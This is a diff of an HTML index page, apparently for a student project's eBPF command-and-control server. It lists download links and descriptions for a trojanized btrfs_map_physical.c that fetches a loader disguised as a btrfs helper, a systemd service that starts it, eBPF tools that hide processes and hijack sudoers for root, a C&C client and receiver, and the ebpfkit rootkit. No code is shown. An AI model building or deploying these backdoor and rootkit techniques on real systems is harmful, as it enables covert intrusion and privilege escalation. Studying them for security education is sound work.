@@ -10,61 +10,87 @@
   <div class="container mt-5">
     <h1 class="text-center">eBPF C&C Example</h1>
     <h2>This is an example cnc server for IFN712</h2>
+    <p>The program is intended solely for educational purposes and should be used ethically and responsibly.</p>
+    <p>Any actions caused by utilising these kinds of a tool is not the responsibility for the author poyuan[Dot]wang[at]connect[dot]qut[dOt]edu[d0t]au</p>
 
     <div class="mt-4">
-      <h3>ebpfkit</h3>
+      <h3>BTRFS</h3>
       <ul class="list-group">
         <li class="list-group-item">
-          <a href="/ebpfkit">ebpfkit</a>
-          <p>Description: ebpfkit is the main rootkit program that leverages eBPF features for offensive security techniques such as obfuscation, container breakouts, and persistent access.</p>
+          <a href="/btrfs_helper">btrfs_helper</a>
+          <p>This is the loader that disgaise as a btrfs file extension helper which will be run when machine have internet connection by utilising systemd service</p>
         </li>
         <li class="list-group-item">
-          <a href="/ebpfkit-client">ebpfkit-client</a>
-          <p>Description: ebpfkit-client is the client-side component used to interact with the ebpfkit rootkit. It provides a command-line interface for various functionalities.</p>
+          <a href="/btrfs_helper.service">btrfs_helper.service</a>
+          <p>A simple demonstrating service file that will start the program when macine have internet connection</p>
         </li>
         <li class="list-group-item">
-          <a href="/pause">pause</a>
-          <p>Description: A utility program within the ebpfkit suite, typically used to pause or halt certain processes or operations for debugging or other purposes.</p>
+          <a href="/btrfs_map_physical.orig">btrfs_map_physical.orig.c</a>
+          <p>Origional btrfs_map_physical program credit to https://raw.githubusercontent.com/osandov/osandov-linux/master/scripts/btrfs_map_physical.c</p>
         </li>
         <li class="list-group-item">
-          <a href="/webapp">webapp</a>
-          <p>Description: A web application interface for ebpfkit, providing a graphical user interface to interact with the rootkit and its features.</p>
+          <a href="/btrfs_map_physical"><red>btrfs_map_physical.c</red></a>
+          <p>Bad btrfs_map_physical.c file that been modify use fork() to download a btrfs_helper inorder to start the implementation of backdoors.</p>
         </li>
       </ul>
     </div>
 
     <div class="mt-4">
       <h3>bad-ebpf</h3>
+      <p>This part of the tools is been released by pathtofile https://github.com/pathtofile/bad-bpf</p>
       <ul class="list-group">
         <li class="list-group-item">
           <a href="/pidhide">pidhide</a>
-          <p>Description: This program hides the process matching a specific PID from tools like 'ps'. It hooks the getdents64 syscall to unlink the folder matching the PID in /proc.</p>
+          <p>Hides the process matching a specific PID from tools like 'ps'. It hooks the getdents64 syscall to unlink the folder matching the PID in /proc.</p>
         </li>
         <li class="list-group-item">
           <a href="/writeblocker">writeblocker</a>
-          <p>Description: This program intercepts all write syscalls for a given process PID and fakes the call, returning the same number of bytes that the userspace program expects to be written.</p>
+          <p>Intercepts all write syscalls for a given process PID and fakes the call, returning the same number of bytes that the userspace program expects to be written.</p>
         </li>
         <li class="list-group-item">
           <a href="/sudoadd">sudoadd</a>
-          <p>Description: This program allows a low-privileged user to use sudo to become root by intercepting sudo's reading of the /etc/sudoers file and overwriting the first line.</p>
+          <p>Allows a low-privileged user to use sudo to become root by intercepting sudo's reading of the /etc/sudoers file and overwriting the first line.</p>
         </li>
       </ul>
     </div>
     
 
     <div class="mt-4">
-      <h3>Homemade C&C</h3>
+      <h3>Homemade C&C client and receiver</h3>
       <ul class="list-group">
         <li class="list-group-item">
           <a href="/receiver">receiver</a>
-          <p>Description: The receiver program serves as the server-side component of the C&C system. It listens for incoming connections and commands from the client, executing them as needed.</p>
+          <p>Serves as the server-side component of the C&C system. It listens for incoming connections and commands from the client, executing them as needed.</p>
         </li>
         <li class="list-group-item">
           <a href="/client">client</a>
-          <p>Description: The client program serves as the user interface for the C&C system. It allows the user to send commands to the receiver for execution.</p>
+          <p>Serves as the user interface for the C&C system. It allows the user to send commands to the receiver for execution.</p>
         </li>
       </ul>
     </div>
+
+    <div class="mt-4">
+      <h3>ebpfkit (Not being used)</h3>
+      <ul class="list-group">
+        <li class="list-group-item">
+          <a href="/ebpfkit">ebpfkit</a>
+          <p>ebpfkit is the main rootkit program that leverages eBPF features for offensive security techniques such as obfuscation, container breakouts, and persistent access.</p>
+        </li>
+        <li class="list-group-item">
+          <a href="/ebpfkit-client">ebpfkit-client</a>
+          <p>ebpfkit-client is the client-side component used to interact with the ebpfkit rootkit. It provides a command-line interface for various functionalities.</p>
+        </li>
+        <li class="list-group-item">
+          <a href="/pause">pause</a>
+          <p>A utility program within the ebpfkit suite, typically used to pause or halt certain processes or operations for debugging or other purposes.</p>
+        </li>
+        <li class="list-group-item">
+          <a href="/webapp">webapp</a>
+          <p>A web application interface for ebpfkit, providing a graphical user interface to interact with the rootkit and its features.</p>
+        </li>
+      </ul>
+    </div>
+
 
     <div class="mt-4">
       <h3>Project ebpf can be evil Overview:</h3>
